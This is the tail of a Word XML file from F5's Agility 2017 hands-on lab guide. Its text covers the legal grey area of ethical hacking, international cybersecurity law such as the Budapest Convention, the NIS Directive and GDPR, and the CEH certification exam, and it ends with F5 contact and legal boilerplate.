      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pentest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, they effectively cover their corporate eyes and ears while these actions are carried out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5F300E" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>However, often neither the company or the hacker know if/what laws are being broken</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C571EB" w14:textId="6A10DDA0" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>So</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> it is a Grey Area – Ethical Hackers are not granted immunity – they need to ensure that the actions they take do not break the laws outlined in the Law Acts and Statuses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB00D34" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Worlwide</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF74CA5" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>No single international framework for cybersecurity law, but some multi‐lateral efforts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D443E18" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Budapest Convention on Cybercrime (2001)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0EE4A1" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Council of Europe’s effort to harmonize disparate national cybercrime laws</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C65BA05" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>EU Network and Information Security (NIS) Directive</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159E413D" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>PRIVACY – Proposed EU General Data Protection Regulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73397888" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>New law would apply to any company that controls or processes the personal data of Europeans through the offering of goods and services – even if company has no physical presence in Europe.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED1DC29" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Fines of up to 4% of company’s annual global revenue or €20 million for violations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F7FA51" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Other countries each have Cybersecurity laws</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA3457E" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Tensions in Global Cyberspace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28ADA2E1" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>The rapid growth of the Internet and sophistication of cybercrime continues to outpace the ability of the legal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284E5CBE" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>system to respond. The attribution problem makes policing and accountability particularly difficult.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6148B80B" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Cyber assets are distributed between the public sector and private sector, and the private sector is comprised of a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC961BA" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>wide range of disparate entities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B6ED57" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>There is a lack of international coordination on cyber issues. As a result, there is no centralized international cyber</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BC1B78" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>threat information sharing or common computer incident response teams.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78767D9E" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Different values among countries; different levels of preparedness; different degrees of interest and risks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BE0AFC" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Companies and governments face overlapping and conflicting sets of laws:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B857AA" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Harmonization vs. divergence of regional and national laws</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7007E0CF" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Personal data laws and system/infrastructure obligations are not integrated or reconciled</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79484D0C" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Quality of company's cybersecurity depends in part on visibility into traffic on its own network, but such insight can</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C0BC45" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>be in tension with cultural and sometimes legal barriers to electronic monitoring of employees.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E038719" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Approach to implementation: market‐driven vs. regulatory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5862905D" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bullet1"/>
      </w:pPr>
      <w:r>
        <w:t>Governance: government‐centric vs. multi‐stakeholder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099687B6" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Certified Ethical Hacking Certification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE10A49" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>A Certified Ethical Hacker is a skilled professional who understands and knows how to look for weaknesses and vulnerabilities in target systems and uses the same knowledge and tools as a malicious hacker, but in a lawful and legitimate manner to assess the security posture of a target system(s). The CEH credential certifies individuals in the specific network security discipline of Ethical Hacking from a vendor-neutral perspective.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A548310" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>The purpose of the CEH credential is to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="301EA1B9" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Establish and govern minimum standards for credentialing professional information security specialists in ethical hacking measures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222EFA9E" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Inform the public that credentialed individuals meet or exceed the minimum standards.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F515304" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Reinforce ethical hacking as a unique and self-regulating profession.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DEAB590" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>About the Exam</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604451EB" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="380780E9" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Number of Questions: 125</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E92AA3" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Test Duration: 4 Hours</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16156757" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Test Format: Multiple Choice</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2A29F4" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Test Delivery: ECC EXAM, VUE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42985C11" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRDefault="008F2D6F" w:rsidP="008F2D6F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Exam Prefix: 312-50 (ECC EXAM), 312-50 (VUE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45B63C99" w14:textId="77777777" w:rsidR="008F2D6F" w:rsidRPr="00B6572D" w:rsidRDefault="008F2D6F" w:rsidP="00B6572D">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6351D39C" w14:textId="08EB17DE" w:rsidR="00D04158" w:rsidRDefault="00AB6D64">
      <w:pPr>
        <w:pStyle w:val="Call-outQuote"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F42493" w14:textId="77777777" w:rsidR="00C0450F" w:rsidRDefault="00AB6D64" w:rsidP="00C0450F">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:pageBreakBefore/>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc487296579"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Learn More</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w14:paraId="2CA58554" w14:textId="46C0C19B" w:rsidR="00D04158" w:rsidRDefault="00C0450F" w:rsidP="00C0450F">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sign up for an account on </w:t>
      </w:r>
      <w:hyperlink r:id="rId41" w:history="1">
        <w:r w:rsidRPr="005E6111">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://f5.com/labs</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> to stay up to date</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F8A76D" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00AB6D64">
      <w:pPr>
        <w:pStyle w:val="HdgnotinTOC"/>
      </w:pPr>
      <w:r>
        <w:t>Notes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323BFE7A" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00D04158">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="429E6E27" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00D04158">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:sectPr w:rsidR="00D04158">
          <w:headerReference w:type="default" r:id="rId42"/>
          <w:footerReference w:type="default" r:id="rId43"/>
          <w:headerReference w:type="first" r:id="rId44"/>
          <w:footerReference w:type="first" r:id="rId45"/>
          <w:pgSz w:w="12240" w:h="15840" w:code="1"/>
          <w:pgMar w:top="3370" w:right="994" w:bottom="1440" w:left="3600" w:header="720" w:footer="576" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10166"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D04158" w14:paraId="32495CA0" w14:textId="77777777">
        <w:trPr>
          <w:trHeight w:val="10584"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="10238" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="52F4B438" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00AB6D64">
            <w:pPr>
              <w:pStyle w:val="URLonbackpage"/>
              <w:tabs>
                <w:tab w:val="right" w:pos="9090"/>
              </w:tabs>
            </w:pPr>
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:tab/>
              <w:t>F5 Networks, Inc.   |   f5.com</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10B2B152" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00D04158">
            <w:pPr>
              <w:pStyle w:val="URLonbackpage"/>
              <w:tabs>
                <w:tab w:val="right" w:pos="9090"/>
              </w:tabs>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04158" w14:paraId="4D79699E" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="10238" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="437324B1" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00D04158">
            <w:pPr>
              <w:pStyle w:val="Legalese"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3353677A" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00D04158">
            <w:pPr>
              <w:pStyle w:val="Legalese"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="21B5909C" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00AB6D64">
            <w:pPr>
              <w:pStyle w:val="Legalese"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">US Headquarters: 401 Elliott Ave W, Seattle, WA  </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:t>98119  |</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:t xml:space="preserve">  888-882-4447   //   Americas: info@f5.com   //   Asia-Pacific: apacinfo@f5.com   //   Europe/Middle East/Africa: emeainfo@f5.com   //   Japan: f5j-info@f5.com </w:t>
            </w:r>
            <w:r>
              <w:br/>
              <w:t xml:space="preserve">©2017 F5 Networks, Inc. All rights reserved. F5, F5 Networks, and the F5 logo are trademarks of F5 Networks, Inc. in the U.S. and in certain other countries. Other F5 trademarks are identified at f5.com. Any other products, services, or company names referenced herein may be trademarks of their respective owners with no endorsement or affiliation, express or implied, claimed by F5. These training materials and documentation are F5 Confidential Information and are subject to the F5 Networks Reseller Agreement. You may not share these training materials and documentation with any third party without the express written permission of F5. </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="45D5AE09" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00D04158">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00D04158">
      <w:headerReference w:type="default" r:id="rId46"/>
      <w:footerReference w:type="default" r:id="rId47"/>
      <w:pgSz w:w="12240" w:h="15840" w:code="1"/>
      <w:pgMar w:top="3370" w:right="994" w:bottom="576" w:left="108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CB40F" w14:textId="77777777" w:rsidR="00B46461" w:rsidRDefault="00B46461">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="5AEEB107" w14:textId="77777777" w:rsidR="00B46461" w:rsidRDefault="00B46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Neue">
    <w:altName w:val="Corbel"/>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C91D5" w14:textId="77777777" w:rsidR="00526315" w:rsidRDefault="00526315">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
    </w:pPr>
    <w:r>
      <w:t>f5.com</w:t>
    </w:r>
    <w:r>
      <w:tab/>
    </w:r>
    <w:proofErr w:type="spellStart"/>
    <w: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979F6" w14:textId="69A3C2C8" w:rsidR="00526315" w:rsidRDefault="00526315">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
    </w:pPr>
    <w:r>
      <w:t>f5.com</w:t>
    </w:r>
    <w:r>
      <w:tab/>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="002C2D68">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:t>21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9DF1" w14:textId="77777777" w:rsidR="00526315" w:rsidRDefault="005263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652AE" w14:textId="77777777" w:rsidR="00526315" w:rsidRDefault="00526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9A8A5" w14:textId="77777777" w:rsidR="00B46461" w:rsidRDefault="00B46461">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="0A595C95" w14:textId="77777777" w:rsidR="00B46461" w:rsidRDefault="00B46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08DA9" w14:textId="77777777" w:rsidR="00526315" w:rsidRDefault="00526315">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
    <w:r w:rsidRPr="0052583B">
      <w:t>Agility 2017 Hands-on Lab Guide Agility 2017 Hands-on Lab Guide</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660288" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0F4F6E3E" wp14:editId="754509CD">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="column">
                <wp:posOffset>-1650670</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="paragraph">
                <wp:posOffset>1953491</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="6492240" cy="6834249"/>
              <wp:effectExtent l="0" t="0" r="3810" b="5080"/>
              <wp:wrapNone/>
              <wp:docPr id="2" name="Rectangle 2"/>
              <wp:cNvGraphicFramePr/>
              <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                  <wps:wsp>
                    <wps:cNvSpPr/>
                    <wps:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="6492240" cy="6834249"/>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ADBCA" id="Rectangle 2" o:spid="_x0000_s1026" style="position:absolute;margin-left:-129.95pt;margin-top:153.8pt;width:511.2pt;height:53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" fillcolor="#e7e7e4 [3208]" strok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94D06" w14:textId="77777777" w:rsidR="00526315" w:rsidRDefault="00526315">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:drawing>
        <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662336" behindDoc="1" locked="1" layoutInCell="1" allowOverlap="1" wp14:anchorId="7495F009" wp14:editId="37267F22">
          <wp:simplePos x="0" y="0"/>
          <wp:positionH relativeFrom="page">
            <wp:posOffset>1097280</wp:posOffset>
          </wp:positionH>
          <wp:positionV relativeFrom="page">
            <wp:posOffset>283210</wp:posOffset>
          </wp:positionV>
          <wp:extent cx="6391656" cy="950976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 cover.jpg"/>
                  <pic:cNvPicPr/>
                </pic:nvPicPr>
                <pic:blipFill>
                  <a:blip r:embed="rId1">
                    <a:extLst>
                      <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                        <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                      </a:ext>
                    </a:extLst>
                  </a:blip>
                  <a:stretch>
                    <a:fillRect/>
                  </a:stretch>
                </pic:blipFill>
                <pic:spPr>
                  <a:xfrm>
                    <a:off x="0" y="0"/>
                    <a:ext cx="6391656" cy="950976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53022" w14:textId="77777777" w:rsidR="00526315" w:rsidRDefault="00526315">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
    <w:r w:rsidRPr="0052583B">
      <w:t>Agility 2017 Hands-on Lab Guide</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="3D945202" w14:textId="77777777" w:rsidR="00526315" w:rsidRDefault="00526315">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="1" layoutInCell="1" allowOverlap="0" wp14:anchorId="5AE80A8D" wp14:editId="12E99CD7">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="page">
                <wp:posOffset>2286000</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>1600200</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="4846320" cy="0"/>
              <wp:effectExtent l="0" t="0" r="30480" b="19050"/>
              <wp:wrapNone/>
              <wp:docPr id="1" name="Straight Connector 1"/>
              <wp:cNvGraphicFramePr/>
              <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                  <wps:wsp>
                    <wps:cNvCnPr/>
                    <wps:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="4846320" cy="0"/>
                      </a:xfrm>
                      <a:prstGeom prst="line">
                        <a:avLst/>
                      </a:prstGeom>
                      <a:ln>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525F17" id="Straight Connector 1"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80pt,126pt" to="56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" o:allowoverlap="f" strokecolor="#bfbfbf [3206]">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57DE" w14:textId="77777777" w:rsidR="00526315" w:rsidRDefault="0052631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9A5DC" w14:textId="77777777" w:rsidR="00526315" w:rsidRDefault="00526315">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:drawing>
        <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251661312" behindDoc="1" locked="1" layoutInCell="1" allowOverlap="1" wp14:anchorId="2732A0E0" wp14:editId="5C5270C3">
          <wp:simplePos x="0" y="0"/>
          <wp:positionH relativeFrom="page">
            <wp:posOffset>276860</wp:posOffset>
          </wp:positionH>
          <wp:positionV relativeFrom="page">
            <wp:posOffset>273050</wp:posOffset>
          </wp:positionV>
          <wp:extent cx="7241540" cy="95097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 page.png"/>
                  <pic:cNvPicPr/>
                </pic:nvPicPr>
                <pic:blipFill>
                  <a:blip r:embed="rId1">
                    <a:extLst>
                      <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                        <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                      </a:ext>
                    </a:extLst>
                  </a:blip>
                  <a:stretch>
                    <a:fillRect/>
                  </a:stretch>
                </pic:blipFill>
                <pic:spPr>
                  <a:xfrm>
                    <a:off x="0" y="0"/>
                    <a:ext cx="7241540" cy="95097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31F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CF36E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7350C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8362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C395F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="ADDC5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B1329"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="767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9296F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AA38D0F8"/>
    <w:styleLink w:val="StyleNumbered10ptText1Left015Hanging015"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="216" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="5D5356" w:themeColor="text1" w:themeTint="BF"/>
        <w:sz w:val="20"/>
